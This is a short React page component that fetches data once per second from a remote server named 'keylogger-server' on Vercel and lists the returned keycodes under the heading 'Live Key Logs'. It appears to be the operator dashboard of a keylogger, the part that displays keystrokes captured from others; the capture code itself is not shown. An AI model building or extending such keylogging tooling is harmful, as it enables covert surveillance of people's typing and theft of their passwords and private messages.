import { useEffect, useState } from "react";

export default function Home() {
  const [keys, setKeys] = useState([]);

  useEffect(() => {
    const fetchKeys = async () => {
      try {
        const res = await fetch("https://keylogger-server-2ptkbw8gh-harimks-projects.vercel.app//api/data");
        const json = await res.json();
        setKeys(json);
      } catch (err) {
        console.error("Fetch error:", err);
      }
    };

    fetchKeys();
    const interval = setInterval(fetchKeys, 1000);
    return () => clearInterval(interval);
  }, []);

  return (
    <div style={{
      backgroundColor: "white",
      height: "100vh",
      padding: "2rem",
      fontFamily: "monospace"
    }}>
      <h1>Live Key Logs</h1>
      <ul>
        {keys.map((k, i) => (
          <li key={i}>Keycode: {k}</li>
        ))}
      </ul>
    </div>
  );
}

